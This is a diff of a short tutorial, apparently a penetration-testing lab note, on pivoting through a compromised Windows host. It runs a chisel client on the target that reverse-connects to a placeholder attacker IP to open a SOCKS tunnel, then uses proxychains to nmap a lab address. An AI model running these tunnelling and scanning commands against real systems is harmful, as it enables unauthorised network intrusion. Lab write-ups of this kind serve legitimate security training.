@@ -23,12 +23,21 @@ upload chisel.exe to windows target and run following command.
 chisel.exe client <attacker_IP>:<Local_listening_port> R:socks &
 ```
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f4fa68b5-f62c-4f5a-a9f6-28601b830310/Untitled.png)
+![image](https://user-images.githubusercontent.com/55615071/189031515-c4c54896-bd04-40c0-bc7b-43dc82c63afb.png)
+
 
 Remind : & on command is meaning run chisel on background
 
 After run chisel client, check state connect on chisel server. it should be like this
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/eb2252b3-4735-45a4-ac46-52f2ae4e209d/Untitled.png)
+![image](https://user-images.githubusercontent.com/55615071/189031556-d2728e7c-db24-4c89-8c04-bbe52aa36687.png)
 
 try testing by use proxychains before command
+
+![image](https://user-images.githubusercontent.com/55615071/189031576-396b1d6c-7d26-45c6-9793-1d876845a043.png)
+
+proxychains nmap -sT -Pn -sV -sC -p1-6000 192.168.239.129
+
+![image](https://user-images.githubusercontent.com/55615071/189031936-dd2bbdcb-284d-4d58-abd8-e2cb0d3ddb9d.png)
+
+
